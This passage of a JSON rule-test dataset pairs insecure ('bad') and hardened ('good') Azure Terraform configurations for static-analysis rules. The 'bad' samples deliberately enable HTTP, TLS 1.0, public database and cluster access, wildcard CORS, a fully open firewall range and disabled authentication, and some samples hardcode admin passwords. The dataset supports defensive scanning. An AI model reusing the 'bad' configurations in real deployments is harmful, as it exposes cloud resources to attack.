    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_storage_account_network_rules\" \"good_example\" {\n  default_action             = \"Deny\"\n  ip_rules                   = [\"127.0.0.1\"]\n  virtual_network_subnet_ids = [azurerm_subnet.test.id]\n  bypass                     = [\"Metrics\"]\n}",
    "language": "hcl",
    "description": "Azure Storage - network rules deny by default"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: storage-enforce-https\nresource \"azurerm_storage_account\" \"bad_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = false\n}",
    "language": "hcl",
    "description": "Azure Storage - HTTP traffic allowed"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_storage_account\" \"good_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = true\n}",
    "language": "hcl",
    "description": "Azure Storage - HTTPS only"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: storage-queue-services-logging\nresource \"azurerm_storage_account\" \"bad_example\" {\n    name                     = \"example\"\n    resource_group_name      = data.azurerm_resource_group.example.name\n    location                 = data.azurerm_resource_group.example.location\n    account_tier             = \"Standard\"\n    account_replication_type = \"GRS\"\n    queue_properties  {\n  }\n}",
    "language": "hcl",
    "description": "Azure Storage - queue logging not configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_storage_account\" \"good_example\" {\n    name                     = \"example\"\n    resource_group_name      = data.azurerm_resource_group.example.name\n    location                 = data.azurerm_resource_group.example.location\n    account_tier             = \"Standard\"\n    account_replication_type = \"GRS\"\n    queue_properties  {\n    logging {\n        delete                = true\n        read                  = true\n        write                 = true\n        version               = \"1.0\"\n        retention_policy_days = 10\n    }\n  }\n}",
    "language": "hcl",
    "description": "Azure Storage - queue logging enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: storage-allow-microsoft-service-bypass\nresource \"azurerm_storage_account\" \"bad_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n  location                 = azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n\n  network_rules {\n    default_action             = \"Deny\"\n    ip_rules                   = [\"100.0.0.1\"]\n    virtual_network_subnet_ids = [azurerm_subnet.example.id]\n      bypass                     = [\"Metrics\"]\n  }\n}",
    "language": "hcl",
    "description": "Azure Storage - missing AzureServices bypass"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_storage_account\" \"good_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n  location                 = azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n\n  network_rules {\n    default_action             = \"Deny\"\n    ip_rules                   = [\"100.0.0.1\"]\n    virtual_network_subnet_ids = [azurerm_subnet.example.id]\n    bypass                     = [\"Metrics\", \"AzureServices\"]\n  }\n}",
    "language": "hcl",
    "description": "Azure Storage - AzureServices bypass included"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-storage-blob-service-container-private-access\nresource \"azurerm_storage_container\" \"example\" {\n    name                  = \"vhds\"\n    storage_account_name  = azurerm_storage_account.example.name\n    container_access_type = \"blob\"\n}",
    "language": "hcl",
    "description": "Azure Storage - blob container public access"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_storage_container\" \"example\" {\n    name                  = \"vhds\"\n    storage_account_name  = azurerm_storage_account.example.name\n    container_access_type = \"private\"\n}",
    "language": "hcl",
    "description": "Azure Storage - blob container private access"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n    # ruleid: appservice-use-secure-tls-policy\n      min_tls_version = \"1.0\"\n  }\n}",
    "language": "hcl",
    "description": "Azure App Service - outdated TLS version"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n      min_tls_version = \"1.2\"\n  }\n}",
    "language": "hcl",
    "description": "Azure App Service - TLS 1.2"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: appservice-enable-https-only\nresource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = false\n}\n\n# ruleid: appservice-enable-https-only\nresource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}",
    "language": "hcl",
    "description": "Azure App Service - HTTPS not enforced"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_app_service\" \"good_example\" {\n    name                       = \"example-app-service\"\n    location                   = azurerm_resource_group.example.location\n    resource_group_name        = azurerm_resource_group.example.name\n    app_service_plan_id        = azurerm_app_service_plan.example.id\n    https_only                 = true\n}",
    "language": "hcl",
    "description": "Azure App Service - HTTPS enforced"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: appservice-authentication-enabled\nresource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}\n\n# ruleid: appservice-authentication-enabled\nresource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  auth_settings {\n    enabled = false\n  }\n}",
    "language": "hcl",
    "description": "Azure App Service - authentication disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  auth_settings {\n    enabled = true\n  }\n}",
    "language": "hcl",
    "description": "Azure App Service - authentication enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-remote-debugging-not-enabled\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    }\n    remote_debugging_enabled = true\n}",
    "language": "hcl",
    "description": "Azure App Service - remote debugging enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    }\n    remote_debugging_enabled = false\n}",
    "language": "hcl",
    "description": "Azure App Service - remote debugging disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "resource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    cors {\n        # ruleid: azure-appservice-disallowed-cors\n        allowed_origins = [\"*\"]\n    }\n    }\n}",
    "language": "hcl",
    "description": "Azure App Service - wildcard CORS origin"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    cors {\n        allowed_origins = [\"192.0.0.1\"]\n    }\n    }\n}",
    "language": "hcl",
    "description": "Azure App Service - specific CORS origins"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: functionapp-authentication-enabled\nresource \"azurerm_function_app\" \"bad_example\" {\n  name                = \"example-function-app\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_function_app_plan.example.id\n}\n\n# ruleid: functionapp-authentication-enabled\nresource \"azurerm_function_app\" \"bad_example\" {\n  name                = \"example-function-app\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_function_app_plan.example.id\n\n  auth_settings {\n    enabled = false\n  }\n}",
    "language": "hcl",
    "description": "Azure Function App - authentication disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_function_app\" \"good_example\" {\n  name                = \"example-function-app\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_function_app_plan.example.id\n\n  auth_settings {\n    enabled = true\n  }\n}",
    "language": "hcl",
    "description": "Azure Function App - authentication enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "resource \"azurerm_function_app\" \"example\" {\n  name                       = \"test-azure-functions\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  site_config {\n    cors {\n        # ruleid: azure-functionapp-disallow-cors\n        allowed_origins = [\"*\"]\n    }\n  }\n}",
    "language": "hcl",
    "description": "Azure Function App - wildcard CORS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_function_app\" \"example\" {\n  name                       = \"test-azure-functions\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  site_config {\n    cors {\n        allowed_origins = [\"192.0.0.1\"]\n    }\n  }\n}",
    "language": "hcl",
    "description": "Azure Function App - specific CORS origins"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: keyvault-specify-network-acl\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n}\n\n# ruleid: keyvault-specify-network-acl\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n\n    network_acls {\n        bypass = \"AzureServices\"\n        default_action = \"Allow\"\n    }\n}",
    "language": "hcl",
    "description": "Azure Key Vault - network ACLs missing or allow default"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_key_vault\" \"good_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.good_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n\n    network_acls {\n        bypass = \"AzureServices\"\n        default_action = \"Deny\"\n    }\n}",
    "language": "hcl",
    "description": "Azure Key Vault - network ACLs with deny default"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: keyvault-purge-enabled\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n    purge_protection_enabled    = false\n}\n\n# ruleid: keyvault-purge-enabled\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n}",
    "language": "hcl",
    "description": "Azure Key Vault - purge protection disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_key_vault\" \"good_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.good_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = true\n}",
    "language": "hcl",
    "description": "Azure Key Vault - purge protection enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: keyvault-ensure-key-expires\nresource \"azurerm_key_vault_key\" \"bad_example\" {\n  name         = \"generated-certificate\"\n  key_vault_id = azurerm_key_vault.example.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n\n  key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n  ]\n}",
    "language": "hcl",
    "description": "Azure Key Vault - key without expiration date"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_key_vault_key\" \"good_example\" {\n  name         = \"generated-certificate\"\n  key_vault_id = azurerm_key_vault.example.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n  expiration_date = \"1982-12-31T00:00:00Z\"\n\n  key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n  ]\n}",
    "language": "hcl",
    "description": "Azure Key Vault - key with expiration date"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-sqlserver-public-access-disabled\nresource \"azurerm_mssql_server\" \"example\" {\n    name                         = \"mssqlserver\"\n    resource_group_name          = azurerm_resource_group.example.name\n    location                     = azurerm_resource_group.example.location\n    version                      = \"12.0\"\n    administrator_login          = \"missadministrator\"\n    administrator_login_password = \"thisIsKat11\"\n    minimum_tls_version          = \"1.2\"\n    public_network_access_enabled = true\n    azuread_administrator {\n    login_username = \"AzureAD Admin\"\n    object_id      = \"00000000-0000-0000-0000-000000000000\"\n    }\n}\n\n# ruleid: azure-sqlserver-public-access-disabled\nresource \"azurerm_mssql_server\" \"example\" {\n    name                         = \"mssqlserver\"\n    resource_group_name          = azurerm_resource_group.example.name\n    location                     = azurerm_resource_group.example.location\n    version                      = \"12.0\"\n    administrator_login          = \"missadministrator\"\n    administrator_login_password = \"thisIsKat11\"\n    minimum_tls_version          = \"1.2\"\n    azuread_administrator {\n    login_username = \"AzureAD Admin\"\n    object_id      = \"00000000-0000-0000-0000-000000000000\"\n    }\n}",
    "language": "hcl",
    "description": "Azure SQL Server - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_mssql_server\" \"example\" {\n    name                         = \"mssqlserver\"\n    resource_group_name          = azurerm_resource_group.example.name\n    location                     = azurerm_resource_group.example.location\n    version                      = \"12.0\"\n    administrator_login          = \"missadministrator\"\n    administrator_login_password = \"thisIsKat11\"\n    minimum_tls_version          = \"1.2\"\n    public_network_access_enabled = false\n    azuread_administrator {\n    login_username = \"AzureAD Admin\"\n    object_id      = \"00000000-0000-0000-0000-000000000000\"\n    }\n}",
    "language": "hcl",
    "description": "Azure SQL Server - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "resource \"azurerm_mssql_server\" \"examplea\" {\n    name                          = var.server_name\n    resource_group_name           = var.resource_group.name\n    location                      = var.resource_group.location\n    version                       = var.sql[\"version\"]\n    administrator_login           = var.sql[\"administrator_login\"]\n    administrator_login_password  = local.administrator_login_password\n    # ruleid: azure-mssql-service-mintls-version\n    minimum_tls_version           = \"1.0\"\n    public_network_access_enabled = var.sql[\"public_network_access_enabled\"]\n    identity {\n    type = \"SystemAssigned\"\n    }\n}",
    "language": "hcl",
    "description": "Azure MSSQL - outdated TLS version"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_mssql_server\" \"examplea\" {\n    name                          = var.server_name\n    resource_group_name           = var.resource_group.name\n    location                      = var.resource_group.location\n    version                       = var.sql[\"version\"]\n    administrator_login           = var.sql[\"administrator_login\"]\n    administrator_login_password  = local.administrator_login_password\n    minimum_tls_version           = \"1.2\"\n    public_network_access_enabled = var.sql[\"public_network_access_enabled\"]\n    identity {\n    type = \"SystemAssigned\"\n    }\n}",
    "language": "hcl",
    "description": "Azure MSSQL - TLS 1.2"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-sqlserver-no-public-access\nresource \"azurerm_mysql_firewall_rule\" \"example\" {\n  name                = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_mysql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"255.255.255.255\"\n}",
    "language": "hcl",
    "description": "Azure SQL - wide-open firewall rule"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_mysql_firewall_rule\" \"example\" {\n  name                = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_mysql_server.example.name\n  start_ip_address    = \"40.112.8.12\"\n  end_ip_address      = \"40.112.8.17\"\n}",
    "language": "hcl",
    "description": "Azure SQL - specific IP range"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-mysql-public-access-disabled\nresource \"azurerm_mysql_server\" \"example\" {\n  name                = var.mysqlserver_name\n  location            = var.resource_group.location\n  resource_group_name = var.resource_group.name\n\n  administrator_login          = var.admin_name\n  administrator_login_password = var.password\n  sku_name = var.sku_name\n  storage_mb = var.storage_mb\n  version    = var.server_version\n\n  auto_grow_enabled            = true\n  backup_retention_days        = 7\n  geo_redundant_backup_enabled = false\n  infrastructure_encryption_enabled = false\n    public_network_access_enabled = true\n}\n\n# ruleid: azure-mysql-public-access-disabled\nresource \"azurerm_mysql_server\" \"example\" {\n  name                = var.mysqlserver_name\n  location            = var.resource_group.location\n  resource_group_name = var.resource_group.name\n\n  administrator_login          = var.admin_name\n  administrator_login_password = var.password\n  sku_name = var.sku_name\n  storage_mb = var.storage_mb\n  version    = var.server_version\n\n  auto_grow_enabled            = true\n  backup_retention_days        = 7\n  geo_redundant_backup_enabled = false\n  infrastructure_encryption_enabled = false\n}",
    "language": "hcl",
    "description": "Azure MySQL - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_mysql_server\" \"example\" {\n  name                = var.mysqlserver_name\n  location            = var.resource_group.location\n  resource_group_name = var.resource_group.name\n\n  administrator_login          = var.admin_name\n  administrator_login_password = var.password\n  sku_name = var.sku_name\n  storage_mb = var.storage_mb\n  version    = var.server_version\n\n  auto_grow_enabled            = true\n  backup_retention_days        = 7\n  geo_redundant_backup_enabled = false\n  infrastructure_encryption_enabled = false\n  public_network_access_enabled = false\n}",
    "language": "hcl",
    "description": "Azure MySQL - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-postgresql-server-public-access-disabled\nresource \"azurerm_postgresql_server\" \"example\" {\n    name                = \"example-psqlserver\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    administrator_login          = \"psqladminun\"\n    administrator_login_password = \"H@Sh1CoR3!\"\n\n    sku_name   = \"GP_Gen5_4\"\n    version    = \"9.6\"\n    storage_mb = 640000\n\n    backup_retention_days        = 7\n    geo_redundant_backup_enabled = true\n    auto_grow_enabled            = true\n\n    public_network_access_enabled    = true\n    ssl_enforcement_enabled          = true\n    ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}",
    "language": "hcl",
    "description": "Azure PostgreSQL - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_postgresql_server\" \"example\" {\n    name                = \"example-psqlserver\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    administrator_login          = \"psqladminun\"\n    administrator_login_password = \"H@Sh1CoR3!\"\n\n    sku_name   = \"GP_Gen5_4\"\n    version    = \"9.6\"\n    storage_mb = 640000\n\n    backup_retention_days        = 7\n    geo_redundant_backup_enabled = true\n    auto_grow_enabled            = true\n\n    public_network_access_enabled    = false\n    ssl_enforcement_enabled          = true\n    ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}",
    "language": "hcl",
    "description": "Azure PostgreSQL - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-aks-private-clusters-enabled\nresource \"azurerm_kubernetes_cluster\" \"example\" {\nname                = \"example-aks1\"\nlocation            = azurerm_resource_group.example.location\nresource_group_name = azurerm_resource_group.example.name\ndns_prefix          = \"exampleaks1\"\n\n    default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n    }\n    identity {\n    type = \"SystemAssigned\"\n    }\n}\n\n# ruleid: azure-aks-private-clusters-enabled\nresource \"azurerm_kubernetes_cluster\" \"example\" {\n    name                = \"example-aks1\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    dns_prefix          = \"exampleaks1\"\n    private_cluster_enabled = false\n\n    default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n    }\n\n    identity {\n    type = \"SystemAssigned\"\n    }\n}",
    "language": "hcl",
    "description": "Azure AKS - public cluster"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_kubernetes_cluster\" \"example\" {\nname                = \"example-aks1\"\nlocation            = azurerm_resource_group.example.location\nresource_group_name = azurerm_resource_group.example.name\ndns_prefix          = \"exampleaks1\"\nprivate_cluster_enabled = true\n\ndefault_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n}\n\nidentity {\n    type = \"SystemAssigned\"\n}\n}",
    "language": "hcl",
    "description": "Azure AKS - private cluster enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-aks-apiserver-auth-ip-ranges\nresource \"azurerm_kubernetes_cluster\" \"default\" {\n  name                = \"example\"\n  location            = \"azurerm_resource_group.example.location\"\n  resource_group_name = \"azurerm_resource_group.example.name\"\n  dns_prefix          = \"example\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n\n# ruleid: azure-aks-apiserver-auth-ip-ranges\nresource \"azurerm_kubernetes_cluster\" \"empty\" {\n  name                = \"example\"\n  location            = \"azurerm_resource_group.example.location\"\n  resource_group_name = \"azurerm_resource_group.example.name\"\n  dns_prefix          = \"example\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n\n  api_server_authorized_ip_ranges = []\n}",
    "language": "hcl",
    "description": "Azure AKS - no API server IP restrictions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_kubernetes_cluster\" \"enabled\" {\n  name                = \"example\"\n  location            = \"azurerm_resource_group.example.location\"\n  resource_group_name = \"azurerm_resource_group.example.name\"\n  dns_prefix          = \"example\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n\n  api_server_authorized_ip_ranges = [\"192.168.0.0/16\"]\n}",
    "language": "hcl",
    "description": "Azure AKS - authorized IP ranges configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-aks-uses-disk-encryptionset\nresource \"azurerm_kubernetes_cluster\" \"example\" {\n    name                = \"example-aks1\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    dns_prefix          = \"exampleaks1\"\n\n    default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n    }\n\n    identity {\n    type = \"SystemAssigned\"\n    }\n}",
    "language": "hcl",
    "description": "Azure AKS - no disk encryption set"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_kubernetes_cluster\" \"example\" {\n    name                = \"example-aks1\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    dns_prefix          = \"exampleaks1\"\n    disk_encryption_set_id = \"someId\"\n\n    default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n    }\n\n    identity {\n    type = \"SystemAssigned\"\n    }\n}",
    "language": "hcl",
    "description": "Azure AKS - disk encryption set configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-cosmosdb-disables-public-network\nresource \"azurerm_cosmosdb_account\" \"db\" {\n    name                = \"tfex-cosmos-db-${random_integer.ri.result}\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n    offer_type          = \"Standard\"\n    kind                = \"GlobalDocumentDB\"\n\n    enable_automatic_failover = true\n\n    consistency_policy {\n    consistency_level       = \"BoundedStaleness\"\n    max_interval_in_seconds = 10\n    max_staleness_prefix    = 200\n    }\n\n    geo_location {\n    location          = var.failover_location\n    failover_priority = 1\n    }\n\n    geo_location {\n    location          = azurerm_resource_group.rg.location\n    failover_priority = 0\n    }\n}\n\n# ruleid: azure-cosmosdb-disables-public-network\nresource \"azurerm_cosmosdb_account\" \"db\" {\n    name                = \"tfex-cosmos-db-${random_integer.ri.result}\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n    offer_type          = \"Standard\"\n    kind                = \"GlobalDocumentDB\"\n\n    public_network_access_enabled = true\n    enable_automatic_failover = true\n\n    consistency_policy {\n      consistency_level       = \"BoundedStaleness\"\n      max_interval_in_seconds = 10\n      max_staleness_prefix    = 200\n    }\n\n    geo_location {\n      location          = var.failover_location\n      failover_priority = 1\n    }\n\n    geo_location {\n      location          = azurerm_resource_group.rg.location\n      failover_priority = 0\n    }\n}",
    "language": "hcl",
    "description": "Azure Cosmos DB - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
